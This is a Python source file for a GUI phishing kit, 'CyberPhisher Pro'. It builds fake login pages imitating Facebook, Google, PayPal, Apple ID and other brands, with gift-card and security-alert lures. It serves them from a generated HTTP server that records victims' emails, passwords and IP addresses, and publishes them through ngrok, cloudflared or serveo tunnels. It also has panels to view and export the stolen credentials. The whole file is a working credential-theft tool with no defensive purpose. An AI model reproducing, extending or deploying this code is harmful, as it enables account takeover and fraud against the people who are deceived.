import tkinter as tk
from tkinter import messagebox
import threading, os, random, json, socket, subprocess, sys, string, hashlib, shutil, time
from datetime import datetime

class CyberPhisher:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')
        self.server_process = None
        self.tunnel_process = None
        self.current_page = None
        self.current_port = 8080

    def build(self):
        self.frame.pack(fill='both', expand=True)
        header = tk.Frame(self.frame, bg='#1a1a2e'); header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="CyberPhisher Pro", font=('Courier',16,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='left')
        self.live_dot = tk.Label(header, text="● OFFLINE", font=('Courier',9,'bold'), fg='#666', bg='#1a1a2e')
        self.live_dot.pack(side='right', padx=5)
        
        # Detect available tunnels
        tunnels_available = []
        if shutil.which("ngrok"): tunnels_available.append("ngrok")
        if shutil.which("cloudflared"): tunnels_available.append("cloudflared")
        if shutil.which("loclx"): tunnels_available.append("loclx")
        if shutil.which("ssh"): tunnels_available.append("serveo")
        self.tunnels = tunnels_available
        
        tunnel_text = " | ".join(tunnels_available) if tunnels_available else "No tunnels installed"
        tk.Label(header, text=tunnel_text, font=('Courier',8), fg='#ffaa00', bg='#1a1a2e').pack(side='right', padx=5)

        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y'); hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))

        pages = [
            ("Facebook","#1877f2","facebook"),("Instagram","#e4405f","instagram"),("Google","#4285f4","google"),
            ("Microsoft","#00a4ef","microsoft"),("Twitter/X","#1da1f2","twitter"),("LinkedIn","#0a66c2","linkedin"),
            ("GitHub","#333","github"),("Netflix","#e50914","netflix"),("PayPal","#003087","paypal"),
            ("Amazon","#ff9900","amazon"),("Dropbox","#0061ff","dropbox"),("Snapchat","#fffc00","snapchat"),
            ("TikTok","#000","tiktok"),("Spotify","#1db954","spotify"),("Steam","#00adee","steam"),
            ("Gmail","#ea4335","gmail"),("Outlook","#0078d4","outlook"),("Yahoo","#6001d2","yahoo"),
            ("Apple ID","#000","apple"),("Adobe","#ff0000","adobe"),
        ]
        
        pf = tk.LabelFrame(inner, text=" PHISHING PAGES ", font=('Courier',10,'bold'), fg='#ff0000', bg='#16213e', padx=8, pady=5)
        pf.pack(fill='x', padx=10, pady=3)
        for i in range(0, len(pages), 5):
            row = tk.Frame(pf, bg='#16213e'); row.pack(fill='x', pady=1)
            for name, color, slug in pages[i:i+5]:
                tk.Button(row, text=name, font=('Courier',8,'bold'), fg='#fff', bg=color, relief='raised', padx=6, pady=5,
                        command=lambda n=name,c=color,s=slug: self._show_tunnel_chooser(n,c,s)).pack(side='left', padx=1, expand=True, fill='x')

        sf = tk.LabelFrame(inner, text=" CONTROL ", font=('Courier',10,'bold'), fg='#00ff88', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        srow = tk.Frame(sf, bg='#16213e'); srow.pack(fill='x')
        tk.Button(srow, text="STOP ALL", font=('Courier',9,'bold'), fg='#fff', bg='#cc0000', relief='raised', padx=10, pady=5, command=self._stop_server).pack(side='left', padx=2)
        tk.Button(srow, text="View Captures", font=('Courier',9), fg='#fff', bg='#ff4444', relief='flat', padx=10, pady=5, command=self._view_creds).pack(side='left', padx=2)
        tk.Button(srow, text="Export", font=('Courier',9), fg='#fff', bg='#ffaa00', relief='flat', padx=10, pady=5, command=self._export_creds).pack(side='left', padx=2)
        tk.Button(srow, text="Clear", font=('Courier',9), fg='#fff', bg='#cc0000', relief='flat', padx=10, pady=5, command=self._clear_creds).pack(side='left', padx=2)

        self.url_frame = tk.LabelFrame(inner, text=" LIVE URL ", font=('Courier',10,'bold'), fg='#3fb950', bg='#0a2a0a', padx=15, pady=10)
        self.url_frame.pack(fill='x', padx=10, pady=5)
        self.url_label = tk.Label(self.url_frame, text="Server Offline", font=('Courier',14,'bold'), fg='#666', bg='#0a2a0a')
        self.url_label.pack()
        self.url_detail = tk.Label(self.url_frame, text="Select a page and tunnel type", font=('Courier',9), fg='#555', bg='#0a2a0a')
        self.url_detail.pack(pady=3)
        self.copy_btn = tk.Button(self.url_frame, text="Copy URL", font=('Courier',10,'bold'), fg='#000', bg='#00ff88',
                relief='raised', padx=15, pady=6, command=self._copy_url, state='disabled')
        self.copy_btn.pack(pady=5)

        self.output = tk.Text(inner, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat', height=6)
        self.output.pack(fill='both', expand=True, padx=10, pady=5)
        self.status = tk.Label(inner, text="Ready", font=('Courier',8), fg='#888', bg='#1a1a2e')
        self.status.pack(anchor='w', padx=10)

    def _show_tunnel_chooser(self, name, color, slug):
        """Show dialog to choose tunnel type"""
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Choose Tunnel"); d.geometry("400x350")
        tk.Label(d, text=f"Launch: {name}", font=('Courier',14,'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        tk.Label(d, text="Choose how to expose your server:", font=('Courier',10), fg='#fff', bg='#1a1a2e').pack()
        
        # Local only
        tk.Button(d, text="Local Network (IP:PORT)", font=('Courier',10,'bold'), fg='#000', bg='#00ccff',
                relief='raised', padx=15, pady=8, command=lambda: [d.destroy(), self._launch(name,color,slug,'local')]).pack(pady=5, padx=20, fill='x')
        tk.Label(d, text="Only accessible on your WiFi network", font=('Courier',8), fg='#888', bg='#1a1a2e').pack()
        
        # Ngrok
        if "ngrok" in self.tunnels:
            tk.Button(d, text="Ngrok (Public URL)", font=('Courier',10,'bold'), fg='#000', bg='#3fb950',
                    relief='raised', padx=15, pady=8, command=lambda: [d.destroy(), self._launch(name,color,slug,'ngrok')]).pack(pady=5, padx=20, fill='x')
            tk.Label(d, text="Free public URL, requires ngrok account", font=('Courier',8), fg='#888', bg='#1a1a2e').pack()
        else:
            tk.Label(d, text="Ngrok not installed - pkg install ngrok", font=('Courier',8), fg='#cc0000', bg='#1a1a2e').pack(pady=2)
        
        # Cloudflared
        if "cloudflared" in self.tunnels:
            tk.Button(d, text="Cloudflare Tunnel (Public URL)", font=('Courier',10,'bold'), fg='#000', bg='#f6821f',
                    relief='raised', padx=15, pady=8, command=lambda: [d.destroy(), self._launch(name,color,slug,'cloudflared')]).pack(pady=5, padx=20, fill='x')
            tk.Label(d, text="Free, fast, no account needed", font=('Courier',8), fg='#888', bg='#1a1a2e').pack()
        else:
            tk.Label(d, text="Cloudflared not installed - pkg install cloudflared", font=('Courier',8), fg='#cc0000', bg='#1a1a2e').pack(pady=2)
        
        # Serveo
        if "ssh" in self.tunnels:
            tk.Button(d, text="Serveo (SSH Tunnel)", font=('Courier',10,'bold'), fg='#000', bg='#888',
                    relief='raised', padx=15, pady=8, command=lambda: [d.destroy(), self._launch(name,color,slug,'serveo')]).pack(pady=5, padx=20, fill='x')
            tk.Label(d, text="ssh -R 80:localhost:PORT serveo.net", font=('Courier',8), fg='#888', bg='#1a1a2e').pack()
        
        # LocalXpose
        if "loclx" in self.tunnels:
            tk.Button(d, text="LocalXpose (Public URL)", font=('Courier',10,'bold'), fg='#000', bg='#00ccff',
                    relief='raised', padx=15, pady=8, command=lambda: [d.destroy(), self._launch(name,color,slug,'loclx')]).pack(pady=5, padx=20, fill='x')
            tk.Label(d, text="Free tier available", font=('Courier',8), fg='#888', bg='#1a1a2e').pack()
        
        tk.Button(d, text="Cancel", font=('Courier',10), fg='#fff', bg='#666', relief='flat', padx=15, pady=5, command=d.destroy).pack(pady=10)

    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80)); ip = s.getsockname()[0]; s.close(); return ip
        except: return '127.0.0.1'

    def _launch(self, name, color, slug, tunnel_type):
        self._stop_server()
        d = os.path.expanduser("~/phishing_pages"); os.makedirs(d, exist_ok=True)
        
        domain = slug + "-" + hashlib.md5(str(random.random()).encode()).hexdigest()[:6]
        page_dir = os.path.join(d, domain); os.makedirs(page_dir, exist_ok=True)
        
        port = random.randint(8000, 9000)
        self.current_port = port
        
        html = self._gen_page(name, color, slug)
        with open(os.path.join(page_dir, 'index.html'), 'w') as f: f.write(html)
        self.current_page = name
        
        server_code = f'''import http.server, urllib.parse, os, json
from datetime import datetime
F=os.path.expanduser("~/phishing_pages/captured_creds.json")
class H(http.server.SimpleHTTPRequestHandler):
 def do_POST(s):
  b=s.rfile.read(int(s.headers.get("Content-Length",0))).decode()
  d=dict(urllib.parse.parse_qsl(b));d["time"]=str(datetime.now());d["ip"]=s.client_address[0];d["page"]="{name}"
  c=[]
  if os.path.exists(F):c=json.load(open(F));c.append(d);json.dump(c,open(F,"w"),indent=2)
  s.send_response(302);s.send_header("Location","https://www.{slug}.com");s.end_headers()
os.chdir(os.path.dirname(os.path.abspath(__file__)))
httpd=http.server.HTTPServer(("0.0.0.0",{port}),H)
httpd.serve_forever()'''
        
        with open(os.path.join(page_dir, 'server.py'), 'w') as f: f.write(server_code)
        self.server_process = subprocess.Popen([sys.executable, os.path.join(page_dir, 'server.py')],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        ip = self._get_ip()
        self.output.insert('end', f"\n{'='*50}\n  PHISHING PAGE LIVE\n  Target: {name}\n  Tunnel: {tunnel_type}\n  Local: {ip}:{port}\n{'='*50}\n")
        self.output.see('end')
        
        # Start tunnel based on type
        public_url = None
        if tunnel_type == 'ngrok' and shutil.which("ngrok"):
            try:
                self.tunnel_process = subprocess.Popen(["ngrok", "http", str(port), "--log=stdout"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(3)
                try:
                    import urllib.request
                    with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3) as r:
                        public_url = json.loads(r.read())["tunnels"][0]["public_url"]
                except: pass
            except: pass
        
        elif tunnel_type == 'cloudflared' and shutil.which("cloudflared"):
            try:
                self.tunnel_process = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for _ in range(10):
                    line = self.tunnel_process.stdout.readline()
                    if "trycloudflare.com" in line:
                        public_url = line.strip().split()[-1]
                        break
            except: pass
        
        elif tunnel_type == 'serveo':
            public_url = f"https://{slug}.serveo.net"
            self.output.insert('end', f"  Run: ssh -R 80:localhost:{port} serveo.net\n")
        
        elif tunnel_type == 'loclx' and shutil.which("loclx"):
            try:
                self.tunnel_process = subprocess.Popen(["loclx", "tunnel", "http", "--port", str(port)],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                time.sleep(3)
            except: pass
        if public_url:
            self.url_label.config(text=public_url, fg='#00ff88')
            self.url_detail.config(text=f"Page: {name} | {tunnel_type} | LIVE", fg='#3fb950')
            self.output.insert('end', f"  Public URL: {public_url}\n")
        else:
            # Generate professional-looking local URL with path
            display_url = f"http://{slug}-verify-{hashlib.md5(domain.encode()).hexdigest()[:8]}.local:{port}"
            actual_url = f"http://{ip}:{port}"
            self.url_label.config(text=actual_url, fg='#00ff88')
            self.url_detail.config(text=f"Page: {name} | Local | {display_url}", fg='#ffaa00')
            self.output.insert('end', f"  Local URL: {actual_url}\n")
            self.output.insert('end', f"  Display as: {display_url}\n")
            self.output.insert('end', f"  Tip: Use ngrok/cloudflared for public URL\n")
        
        self.live_dot.config(text="● LIVE", fg='#00ff88')
        self.copy_btn.config(state='normal')
        self.status.config(text=f"LIVE: {name}")
        self.output.see('end')

    def _gen_page(self, name, color, slug):
        lures = [
            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🎁</div><h2>You Won a Gift Card!</h2><p>Claim your ${random.randint(50,500)} {name} gift card</p><p style="color:#666">Please sign in to claim</p></div>',
            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">🔒</div><h2>Security Verification</h2><p>Unusual activity detected on your account</p><p style="color:#666">Sign in to verify your identity</p></div>',
            f'<div style="text-align:center;padding:40px"><div style="font-size:60px">⚠️</div><h2>Account Verification Required</h2><p>Your account needs immediate verification</p><p style="color:#666">Log in to prevent suspension</p></div>',
        ]
        b = {"facebook":{"logo":"facebook","title":"Facebook","help":"Forgot password?","create":"Create New Account"},
             "google":{"logo":"Google","title":"Sign in","help":"Forgot email?","create":"Create account"},
             "instagram":{"logo":"Instagram","title":"Instagram","help":"Forgot password?","create":"Sign up"},
             "microsoft":{"logo":"Microsoft","title":"Sign in","help":"Can't access account?","create":"Create one!"},
             "twitter":{"logo":"X","title":"Sign in to X","help":"Forgot password?","create":"Sign up"},
             "linkedin":{"logo":"LinkedIn","title":"Sign in","help":"Forgot password?","create":"Join now"},
             "github":{"logo":"GitHub","title":"Sign in to GitHub","help":"Forgot password?","create":"Create account"},
             "netflix":{"logo":"Netflix","title":"Sign In","help":"Need help?","create":"New to Netflix? Sign up"},
             "paypal":{"logo":"PayPal","title":"Log In","help":"Trouble logging in?","create":"Sign Up"},
             "amazon":{"logo":"Amazon","title":"Sign-In","help":"Need help?","create":"Create Amazon account"},
             "gmail":{"logo":"Gmail","title":"Sign in","help":"Forgot email?","create":"Create account"},
             "outlook":{"logo":"Outlook","title":"Sign in","help":"Can't access?","create":"Create one!"},
             "apple":{"logo":"Apple","title":"Sign In","help":"Forgot password?","create":"Create Apple ID"},
        }.get(slug, {"logo":name,"title":f"Sign in to {name}","help":"Forgot password?","create":"Create account"})
        
        return f'''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>{b['title']} - {name}</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}}
.lure{{background:#fff;border-radius:16px;padding:30px;max-width:440px;width:100%;margin-bottom:20px;box-shadow:0 2px 12px rgba(0,0,0,.08);text-align:center}}
.login-card{{background:#fff;border-radius:16px;padding:30px;max-width:440px;width:100%;box-shadow:0 2px 12px rgba(0,0,0,.08)}}
.logo{{font-size:36px;font-weight:700;color:{color};text-align:center;margin-bottom:10px}}
h2{{font-size:20px;color:#1c1e21;text-align:center;margin-bottom:5px}}
.subtitle{{color:#606770;text-align:center;font-size:14px;margin-bottom:20px}}
input{{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #dddfe2;border-radius:8px;font-size:16px}}
input:focus{{outline:none;border-color:{color};box-shadow:0 0 0 2px {color}33}}
.btn{{width:100%;padding:12px;background:{color};color:#fff;border:none;border-radius:8px;font-size:18px;font-weight:700;cursor:pointer;margin:12px 0}}
.btn:hover{{filter:brightness(1.1)}}
.link{{color:{color};text-align:center;display:block;margin:12px 0;font-size:14px;text-decoration:none}}
.divider{{border-top:1px solid #dadde1;margin:20px 0}}
.create-btn{{width:100%;padding:12px;background:#42b72a;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}}
.footer{{text-align:center;margin-top:20px;color:#8a8d91;font-size:12px}}
@media(max-width:480px){{.lure,.login-card{{padding:20px;border-radius:12px}}.logo{{font-size:28px}}}}</style></head>
<body><div class="lure">{random.choice(lures)}</div>
<div class="login-card"><div class="logo">{b['logo']}</div><h2>{b['title']}</h2><p class="subtitle">Enter your credentials to continue</p>
<form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or phone" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button></form>
<a href="#" class="link">{b['help']}</a><div class="divider"></div><button class="create-btn">{b['create']}</button></div>
<div class="footer">{name} Inc. © {datetime.now().year}</div></body></html>'''

    def _copy_url(self):
        url = self.url_label.cget('text')
        self.frame.clipboard_clear(); self.frame.clipboard_append(url)
        messagebox.showinfo("Copied", f"URL copied:\n{url}")

    def _stop_server(self):
        if self.server_process:
            try: self.server_process.kill()
            except: pass; self.server_process = None
        if self.tunnel_process:
            try: self.tunnel_process.kill()
            except: pass; self.tunnel_process = None
        os.system("pkill -f 'python3 server.py' 2>/dev/null")
        os.system("pkill -f ngrok 2>/dev/null")
        os.system("pkill -f cloudflared 2>/dev/null")
        self.url_label.config(text="Server Offline", fg='#666')
        self.url_detail.config(text="Select a page to launch", fg='#555')
        self.live_dot.config(text="● OFFLINE", fg='#666')
        self.copy_btn.config(state='disabled')
        self.status.config(text="Server stopped")

    def _view_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf):
            creds = json.load(open(cf))
            d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Captured Credentials"); d.geometry("600x450")
            tk.Label(d, text=f"Credentials Captured: {len(creds)}", font=('Courier',12,'bold'), fg='#ff0000', bg='#1a1a2e').pack(pady=10)
            t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
            t.pack(fill='both', expand=True, padx=10, pady=5)
            for c in creds[-50:]:
                t.insert('end', f"Email: {c.get('email','?')}\nPass: {c.get('password','?')}\nIP: {c.get('ip','?')}\nTime: {c.get('time','?')[:19]}\nPage: {c.get('page','?')}\n{'─'*40}\n")
            t.config(state='disabled')
            bf = tk.Frame(d, bg='#1a1a2e'); bf.pack(pady=5)
            tk.Button(bf, text="Copy All", font=('Courier',10), fg='#000', bg='#00ccff', relief='flat', padx=15, pady=5,
                    command=lambda: [d.clipboard_clear(), d.clipboard_append(t.get('1.0','end-1c'))]).pack(side='left', padx=5)
            tk.Button(bf, text="Close", font=('Courier',10), fg='#fff', bg='#666', command=d.destroy).pack(side='right', padx=5)
        else:
            messagebox.showinfo("No Data", "No credentials captured yet")

    def _export_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf):
            import shutil
            p = os.path.expanduser(f"~/phishing_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            shutil.copy(cf, p)
            messagebox.showinfo("Exported", f"Saved to:\n{p}")

    def _clear_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf) and messagebox.askyesno("Clear All", "Delete all captured credentials permanently?"):
            os.remove(cf)
            messagebox.showinfo("Cleared", "All credentials deleted")
